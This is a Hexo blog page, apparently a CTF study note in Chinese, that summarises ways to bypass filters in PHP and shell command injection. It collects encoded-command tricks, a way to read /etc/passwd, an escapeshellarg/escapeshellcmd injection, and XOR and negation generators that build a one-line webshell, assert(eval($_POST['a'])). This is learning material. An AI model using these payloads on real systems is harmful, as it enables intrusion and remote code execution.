@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            rce绕过总结
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">rce绕过总结</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2022-10-11
+                        </span>
+                        
+                            <span id="/2022/10/11/rce绕过总结/" class="leancloud_visitors" data-flag-title="rce绕过总结">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2022/10/11/rce绕过总结/"></span>
+                        </span>  
+                    </p>
+                    
+                    
+                        
+                            <span class="tag-color">ctfknowledge</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h2 id="rce绕过总结"><a href="#rce绕过总结" class="headerlink" title="rce绕过总结"></a>rce绕过总结</h2><ul>
+<li><p>rce常见函数passthru,system,eval,exec<br>passthru — 执行外部程序并且显示原始输出</p>
+</li>
+<li><p>tail,tac,cat 读取文件</p>
+</li>
+<li><p>正则Linux可以使用<code>\</code>绕过,例如<code>cat</code>可以用<code>ca\t</code>绕过。</p>
+</li>
+<li><p>空格<code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;</code></p>
+</li>
+<li><p>过滤<code>t</code>可以用<code>\\t</code></p>
+</li>
+<li><p><a herf=https://www.xinyueseo.com/websecurity/158.html><h>preg_replace &#x2F;e 模式下的漏洞</h></a> <code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str</code><br>payload &#x3D; <code>\S*=$&#123;phpinfo()&#125;</code> (可以用来调用其他函数)</p>
+</li>
+<li><p>shell脚本中的变量切分 <code>$&#123;path:0:1&#125;</code>可以切出一个<code>/</code> 同样变量切分可以切出很多想要的东西</p>
+</li>
+<li><p>命令行执行多次代码 <code>|</code> <code>&amp;&amp;</code>(_GET传参urlencode<code>%26%26</code>)</p>
+</li>
+<li><p>取反脚本(copy别的大佬的)+ 取反绕过<code>&lt;?php echo urlencode(~&#39;phpinfo&#39;);?&gt;</code></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//在命令行中运行</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>.</code>绕过<code>current(localeconv())</code></p>
+</li>
+<li><p>字符的绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash       base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       hex编码绕过(引号可以去掉)</span><br><span class="line">echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh    sh的效果和bash一样</span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line">cat fla*       用*匹配任意</span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">a=g;cat fla$a</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>md5强等于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h5><blockquote>
+<p>eval()<br>assert()<br>create_function()</p>
+</blockquote>
+<h5 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数#"></a>命令执行函数#</h5><blockquote>
+<p>system()<br>passthru()<br>exec()<br>shell_exec()<br>proc_open()<br>popen()<br>pcntl_exec()<br>dl()</p>
+</blockquote>
+<h5 id="单行多命令执行"><a href="#单行多命令执行" class="headerlink" title="单行多命令执行#"></a>单行多命令执行#</h5><blockquote>
+<p>;     执行完前面的语句再执行后面的语句<br>&amp;   两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。<br>&amp;&amp; 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真<br>|     显示后面语句的执行结果<br>||    当前面的语句执行出错时，执行后面的语句<br><code>$(touch TGUCTF)</code> 被$包裹的优先级较高<br><code>touch TGUCTF</code> 在&#96;&#96;内的会被当做命令执行</p>
+</blockquote>
+<h5 id="查看文件命令"><a href="#查看文件命令" class="headerlink" title="查看文件命令"></a>查看文件命令</h5><blockquote>
+<p>cat: 由第一行开始显示文件内容<br>tac: 从最后一行开始显示，可以看出tac是cat的倒写形式<br>nl: 显示的时候顺便显示行号<br>more: 一页一页地显示文件内容<br>less: 与more类似，但是比more更好的是，可以往前翻页<br>tail: 只看结尾几行<br>od: 以二进制的方式读取文件内容<br>&#x2F;bin&#x2F;c?t &#x2F;etc&#x2F;passwd</p>
+</blockquote>
+<h5 id="绕过禁止的flag"><a href="#绕过禁止的flag" class="headerlink" title="绕过禁止的flag"></a>绕过禁止的flag</h5><blockquote>
+<p>fl\ag<br>a&#x3D;fl;b&#x3D;ag;cat $a$b<br>cat <code>ls</code><br>cat $(ls)<br>cat f””lag<br>cat f*<br>cat f???<br>cat ????.???</p>
+</blockquote>
+<h5 id="可利用函数"><a href="#可利用函数" class="headerlink" title="可利用函数"></a>可利用函数</h5><ul>
+<li><code>array_rand()</code>简单来说这个函数可以随机返回一个数组里的值</li>
+<li>打印函数 <code>print_r</code> <code>var_dump</code></li>
+<li><code>eval()</code> 函数<code>scandir</code></li>
+<li><code>system()</code></li>
+<li><code>array_flip()</code>可以得到键值</li>
+</ul>
+<h5 id="escapeshellarg和escapeshellcmd一起使用产生的问题"><a href="#escapeshellarg和escapeshellcmd一起使用产生的问题" class="headerlink" title="escapeshellarg和escapeshellcmd一起使用产生的问题"></a>escapeshellarg和escapeshellcmd一起使用产生的问题</h5><ul>
+<li><code>escapeshellarg</code>的作用就是将单引号转义 并将转义后的单引号的前后两部分再用一个单引号括上<br><code>172.17.0.2&#39; -v -d a=1</code> —&gt; <code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code></li>
+<li><code>escapeshellcmd</code>的作用 反斜线<code>\</code>会在以下字符之前插入：<b>&amp;#;`|*?~&lt;&gt;^()[]{}$\、\x0A </b>和<b> \xFF </b>。<b>‘ </b>和 <b>“ </b>仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及<code>%</code>和<code>!</code>字符前面都有一个插入符号<code>^</code><br> <code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code> —&gt; <code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code></li>
+<li>最后执行的命令是<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为<code> 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为a&#x3D;1’。</li>
+</ul>
+<h5 id="jiaoben"><a href="#jiaoben" class="headerlink" title="jiaoben"></a>jiaoben</h5><ul>
+<li>shell数字构建</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">number = &quot;1234567&quot;</span><br><span class="line">jianyi = &#x27;$((~$(())))&#x27;</span><br><span class="line">nine = &#x27;$((~$((~$(())))$(())))&#x27;</span><br><span class="line"></span><br><span class="line">goujian = &#123;&#x27;0&#x27;:&#x27;$(())&#x27;,</span><br><span class="line">&#x27;1&#x27;:&#x27;$((&#x27;+nine+8*jianyi+&#x27;))&#x27;,&#x27;2&#x27;:&#x27;$((&#x27;+nine+7*jianyi+&#x27;))&#x27;,&#x27;3&#x27;:&#x27;$((&#x27;+nine+6*jianyi+&#x27;))&#x27;,&#x27;4&#x27;:&#x27;$((&#x27;+nine+5*jianyi+&#x27;))&#x27;,&#x27;5&#x27;:&#x27;$((&#x27;+nine+4*jianyi+&#x27;))&#x27;,</span><br><span class="line">&#x27;6&#x27;:&#x27;$((&#x27;+nine+3*jianyi+&#x27;))&#x27;,&#x27;7&#x27;:&#x27;$((&#x27;+nine+2*jianyi+&#x27;))&#x27;,</span><br><span class="line">&#x27;8&#x27;:&#x27;$((&#x27;+nine+1*jianyi+&#x27;))&#x27;,&#x27;9&#x27;:nine,&#125;</span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">if number[0]!=&#x27;-&#x27;:</span><br><span class="line">    for i in number:</span><br><span class="line">        payload += goujian[i]</span><br><span class="line">else :</span><br><span class="line">    for i in number[1:]:</span><br><span class="line">        payload += goujian[i]</span><br><span class="line">if number[0]==&#x27;-&#x27;:</span><br><span class="line">    payload = &#x27;$((~$((&#x27;+payload+jianyi+&#x27;))))&#x27;</span><br><span class="line">print (payload)</span><br></pre></td></tr></table></figure>
+
+<h5 id="无字符rce"><a href="#无字符rce" class="headerlink" title="无字符rce"></a>无字符rce</h5><ul>
+<li>取反</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//在命令行中运行</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>payload</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~&#x27;phpinfo&#x27;); </span><br><span class="line">(~%8F%97%8F%96%91%99%90)();  ==&gt;  phpinfo();</span><br><span class="line"></span><br><span class="line">echo urlencode(~&#x27;assert&#x27;);</span><br><span class="line">echo urlencode(~&#x27;(eval($_POST[&quot;a&quot;]))&#x27;);</span><br><span class="line">(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  ==&gt;  assert(&#x27;eval($_POST[&quot;a&quot;])&#x27;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>异或<br>php版本：PHP Version 7.2.24-0</li>
+</ul>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// 跑出非字母数字异或得到的 $str</span><br><span class="line">$str = &#x27;GET&#x27;;</span><br><span class="line">$exp1 = &#x27;&#x27;;</span><br><span class="line">$exp2 = &#x27;&#x27;;</span><br><span class="line">for ($k = 0; $k &lt; strlen($str); $k++) &#123;</span><br><span class="line">    $flag = 0;</span><br><span class="line">    for ($i = 0; $i &lt; 128; $i++) &#123;</span><br><span class="line">        if (($i &gt;= 48 &amp;&amp; $i &lt;= 57) || ($i &gt;= 65 &amp;&amp; $i &lt;= 90) || ($i &gt;= 97 &amp;&amp; $i &lt;= 122)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        for ($j = 0; $j &lt; 128; $j++) &#123;</span><br><span class="line">            if (($j &gt;= 48 &amp;&amp; $j &lt;= 57) || ($j &gt;= 65 &amp;&amp; $j &lt;= 90) || ($j &gt;= 97 &amp;&amp; $j &lt;= 122)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            if ((chr($i) ^ chr($j)) === $str[$k]) &#123;</span><br><span class="line">                $exp1 = $exp1.urlencode(chr($i));</span><br><span class="line">                $exp2 = $exp2.urlencode(chr($j));</span><br><span class="line">                $flag = 1;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if($flag === 1)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $exp1.&#x27;^&#x27;.$exp2.&quot;\n&quot;;</span><br><span class="line">payload</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">==&gt;  phpinfo()</span><br><span class="line">    </span><br><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br><span class="line">==&gt;  assert(&quot;eval($_POST[&#x27;a&#x27;])&quot;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>类似的</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_ = &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;   //构造出assert</span><br><span class="line">$__ = &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;   //构造出_POST</span><br><span class="line">$___ = $$__;   //$___ = $_POST</span><br><span class="line">$_($___[_]);   //assert($_POST[_]);</span><br></pre></td></tr></table></figure>
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/-f128e7dd768b5.jpg" alt="懒羊羊">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>懒羊羊
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2022/10/11/rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" target="_blank">rce绕过总结</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tags/ctfknowledge/">ctfknowledge</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/2022/10/11/linux%E6%93%8D%E4%BD%9C/" class="prev-prefix">« </a> 上一篇：    <a href="/2022/10/11/linux%E6%93%8D%E4%BD%9C/" title="发布于 2022-10-11 09:25">linux</a>
+                        <br>
+                    
+                    
+                        <a href="/2022/10/09/sql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/" class="next-prefix">» </a> 下一篇：    <a href="/2022/10/09/sql%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/" title="发布于 2022-10-09 08:18">sql注入测试方法.md</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
+    
+</div>
+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>简单地活着，肆意而又精彩！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/-f128e7dd768b5.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user"><span>懒羊羊</span></div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/first19326" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+        <script type="text/javascript" src="/js/APlayer.min.js"></script>
+        <script type="text/javascript" src="/js/Meting.min.js"></script>
+        <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+    
+    
+    <div class="wrap-right">
+        <div class="setting">
+            <div class="iconbox favorites" switch="false">
+                <span class="iconfont icon-favorites"></span>
+                <span class="icontext">关注</span>
+            </div>
+            <div class="iconbox mode">
+                <div class="light">
+                    <span class="iconfont icon-daymode"></span>
+                    <span class="icontext">浅色模式</span>
+                </div>
+                <div class="dark">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                    <span class="icontext">深色模式</span>
+                </div>
+            </div>
+            <a href="javascript:;" target="_self" class="search">
+                <div class="iconbox">
+                    <span class="iconfont icon-search-menu"></span>
+                    <span class="icontext">搜索</span>
+                </div>
+            </a>
+            <div class="iconbox bottom">
+                <div style="display: inline-block; transform: rotate(180deg);">
+                    <span class="iconfont icon-top"></span>
+                </div>
+                <span class="icontext">跳至底部</span>
+            </div>
+        </div>
+        <div class="iconbox set">
+            <div style="display: inline-block;">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="iconbox top">
+            <span class="iconfont icon-top"></span>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "Daylovef",
+        GitHubRepositories : "Hexo-LiveForCode",
+
+        User             : "懒羊羊",
+        UserAvatar       : "/image/sidebar/-f128e7dd768b5.jpg",
+        WebsiteStartDate : "2020-01-01",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) FYL is my girlfriend",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : "/image/website/logo.png",
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/51c6d5c3154ea2f0.jpg",
+            
+                "/image/header/home.jpg",
+            
+                "/image/header/home.jpeg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "简单地活着，肆意而又精彩！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
